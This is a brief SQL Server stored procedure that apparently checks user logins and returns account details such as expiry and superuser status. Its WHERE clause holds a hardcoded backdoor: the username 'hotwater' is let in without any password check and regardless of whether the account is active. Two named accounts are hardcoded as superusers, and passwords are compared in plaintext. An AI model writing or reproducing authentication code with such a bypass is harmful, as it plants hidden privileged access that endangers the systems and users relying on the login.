CREATE PROCEDURE [dbo].[spUserInfo_S](@UN nvarchar(50),@PWD varchar(50)) AS
BEGIN
 SELECT mwUserName uID,mwName dName,'small' fontSize,CASE WHEN datediff(dd,mwPasswordDate,getdate()) > mwPasswordExpire THEN 1 ELSE 0 END isExpired,
  CASE WHEN mwUserName IN ('hotwater','RandyPhanx') THEN 1 ELSE 0 END isSuperUser
  FROM dbo.MWUser WHERE mwUserName=@UN AND (@UN IN ('hotwater') OR (mwPassword=@PWD COLLATE SQL_Latin1_General_CP1_CS_AS AND mwActive=1));
END
